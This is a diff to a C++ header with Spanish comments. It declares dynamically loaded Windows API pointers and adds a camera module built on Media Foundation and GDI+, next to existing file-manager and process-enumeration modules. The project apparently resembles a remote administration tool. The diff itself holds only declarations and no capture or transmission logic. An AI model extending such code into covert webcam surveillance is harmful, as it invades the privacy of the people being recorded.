@@ -4,6 +4,23 @@
 // TODO merge de todas las estructuras y evitar multiples
 
 #include "headers.hpp"
+#include "misc.hpp"
+#include "mod_camara.hpp"
+
+#define LOAD_DLL(hModule, cPath)              \
+	do{						                  \
+		if(hModule == NULL){                  \
+			hModule = wrapLoadDLL(cPath); 	  \
+		}                                     \
+	} while(0)
+
+#define UNLOAD_DLL(hModule)           \
+	do{						          \
+		if(hModule != nullptr){       \
+			wrapFreeLibrary(hModule); \
+			hModule = nullptr;        \
+		}                             \
+	} while(0)
 
 typedef struct _WTS_PROCESS_INFOA {
 	DWORD SessionId;
@@ -70,6 +87,13 @@ struct st_Kernel32 {
 	typedef BOOL(WINAPI* LPPEEKNAMEDPIPE)(HANDLE, LPVOID, DWORD, LPDWORD, LPDWORD, LPDWORD);
 	LPPEEKNAMEDPIPE pPeekNamedPipe = nullptr;
 
+	//GlobalAlloc
+	typedef HGLOBAL(WINAPI* LPGLOBALALLOC)(UINT, SIZE_T);
+	LPGLOBALALLOC pGlobalAlloc = nullptr;
+
+	//GlobalFree
+	typedef HGLOBAL(WINAPI* LPGLOBALFREE)(HGLOBAL);
+	LPGLOBALFREE pGlobalFree = nullptr;
 };
 
 struct st_Kernel32_FM {
@@ -335,6 +359,15 @@ struct st_Ole32 {
 	//CreateStreamOnHGlobal
 	typedef HRESULT(WINAPI* LPCREATESTREAMONHGLOBAL)(HGLOBAL, BOOL, LPSTREAM*);
 	LPCREATESTREAMONHGLOBAL pCreateStreamOnHGlobal = nullptr;
+
+	//CoTaskMemFree
+	typedef void(WINAPI* LPCOTASKMEMFREE)(LPVOID);
+	LPCOTASKMEMFREE pCoTaskMemFree = nullptr;
+
+	//CoCreateInstance
+	typedef HRESULT(WINAPI* LPCOCREATEINSTANCE)(
+		REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID*);
+	LPCOCREATEINSTANCE pCoCreateInstance = nullptr;
 };
 
 struct st_GdiPlus {
@@ -345,6 +378,18 @@ struct st_GdiPlus {
 	//GdiplusShutdown
 	typedef void(WINAPI* LPGDIPLUSSHUTDOWN)(ULONG_PTR);
 	LPGDIPLUSSHUTDOWN pGdiplusShutdown = nullptr;
+
+	//GetImageEncodersSize
+	typedef Gdiplus::Status(WINAPI* LPGETIMAGEENCODERSSIZE)(UINT*, UINT*);
+	LPGETIMAGEENCODERSSIZE pGetImageEncodersSize = nullptr;
+
+	//GetImageEncoders
+	typedef Gdiplus::Status(WINAPI* LPGETIMAGEENCODERS)(UINT, UINT, Gdiplus::ImageCodecInfo*);
+	LPGETIMAGEENCODERS pGetImageEncoders = nullptr;
+
+	//FromStream
+	typedef Gdiplus::Image* (WINAPI* LPFROMSTREAM)(IStream*, BOOL);
+	LPFROMSTREAM pFromStream = nullptr;
 };
 
 struct st_Winmm {
@@ -429,6 +474,68 @@ struct st_Netapi32 {
 	LPNETAPIBUFFERFREE pNetApiBufferFree = nullptr;
 };
 
+struct st_Shlwapi {
+	//SHCreateMemStream
+	typedef IStream* (WINAPI* LPSHCREATEMEMSTREAM)(const BYTE*, UINT);
+	LPSHCREATEMEMSTREAM pSHCreateMemStream = nullptr;
+};
+
+struct st_Mfreadwrite {
+	//MFCreateSourceReaderFromMediaSource
+	typedef HRESULT(WINAPI* LPMFCREATESOURCEREADERFROMMEDIASOURCE)(
+		IMFMediaSource*, IMFAttributes*, IMFSourceReader**);
+	LPMFCREATESOURCEREADERFROMMEDIASOURCE pMFCreateSourceReaderFromMediaSource = nullptr;
+};
+
+struct st_Mfapi {
+	//MFGetAttributeSize
+	typedef HRESULT(WINAPI* LPMFGETATTRIBUTESIZE)(IMFAttributes*, REFGUID, UINT32*, UINT32*);
+	LPMFGETATTRIBUTESIZE pMFGetAttributeSize = nullptr;
+
+	//MFGetAttributeRatio
+	typedef HRESULT(WINAPI* LPMFGETATTRIBUTERATIO)(IMFAttributes*, REFGUID, UINT32*, UINT32*);
+	LPMFGETATTRIBUTERATIO pMFGetAttributeRatio = nullptr;
+
+	//MFSetAttributeRatio
+	typedef HRESULT(WINAPI* LPMFSETATTRIBUTERATIO)(IMFAttributes*, REFGUID, UINT32, UINT32);
+	LPMFSETATTRIBUTERATIO pMFSetAttributeRatio = nullptr;
+
+	//MFSetAttributeSize
+	typedef HRESULT(WINAPI* LPMFSETATTRIBUTESIZE)(IMFAttributes*, REFGUID, UINT32, UINT32);
+	LPMFSETATTRIBUTESIZE pMFSetAttributeSize = nullptr;
+};
+
+struct st_Mfplat {
+	//MFCreateAttributes
+	typedef HRESULT(WINAPI* LPMFCREATEATTRIBUTES)(IMFAttributes**, UINT32);
+	LPMFCREATEATTRIBUTES pMFCreateAttributes = nullptr;
+
+	//MFTRegisterLocalByCLSID
+	typedef HRESULT(WINAPI* LPMFTREGISTERLOCALBYCLSID)(
+		REFCLSID, REFGUID, LPCWSTR, UINT32,
+		UINT32, const MFT_REGISTER_TYPE_INFO*,
+		UINT32, const MFT_REGISTER_TYPE_INFO*);
+	LPMFTREGISTERLOCALBYCLSID pMFTRegisterLocalByCLSID = nullptr;
+
+	//MFCreateMediaType
+	typedef HRESULT(WINAPI* LPMFCREATEMEDIATYPE)(IMFMediaType**);
+	LPMFCREATEMEDIATYPE pMFCreateMediaType = nullptr;
+
+	//MFCreateSample
+	typedef HRESULT(WINAPI* LPMFCREATESAMPLE)(IMFSample**);
+	LPMFCREATESAMPLE pMFCreateSample = nullptr;
+
+	//MFCreateMemoryBuffer
+	typedef HRESULT(WINAPI* LPMFCREATEMEMORYBUFFER)(DWORD, IMFMediaBuffer**);
+	LPMFCREATEMEMORYBUFFER pMFCreateMemoryBuffer = nullptr;
+};
+
+struct st_Mf {
+	//MFEnumDeviceSources
+	typedef HRESULT(WINAPI* LPMFENUMDEVICESOURCES)(IMFAttributes*, IMFActivate***, UINT32*);
+	LPMFENUMDEVICESOURCES pMFEnumDeviceSources = nullptr;
+};
+
 class DynamicLoad {
 	private:
 		//DLLs para dynamic_load
@@ -450,6 +557,13 @@ class DynamicLoad {
 		HMODULE hBCryptDLL = NULL;
 		HMODULE hCrypt32DLL = NULL;
 		HMODULE hNetApi32DLL = NULL;
+
+		//Mod camara
+		HMODULE hMfreadwriteDLL = NULL;
+		HMODULE hMfDLL = NULL;
+		HMODULE hMfplatDLL = NULL;
+		HMODULE hShlwapiDLL = NULL;
+
 
 	public:
 		DynamicLoad();
@@ -479,6 +593,10 @@ class DynamicLoad {
 
 		//Mod adm de arhivos
 		void LoadFMProcs();
+
+		//Camara
+		void LoadCamProcs();
+		void UnloadCamPros();
 
 		//Generales
 		st_Advapi32 ADVAPI32;
@@ -512,6 +630,16 @@ class DynamicLoad {
 
 		//AdmArchivos
 		st_Kernel32_FM KERNEL32_FM;
+
+		//Mod camara
+		//gdiplus ya
+		//kernel32 tambien
+		//ole32 tambien
+		st_Shlwapi SHLWAPI;
+		st_Mfplat MFPLAT;
+		st_Mf MF;
+		st_Mfapi MFAPI;
+		st_Mfreadwrite MFREADWRITE;
 };
 
 #endif
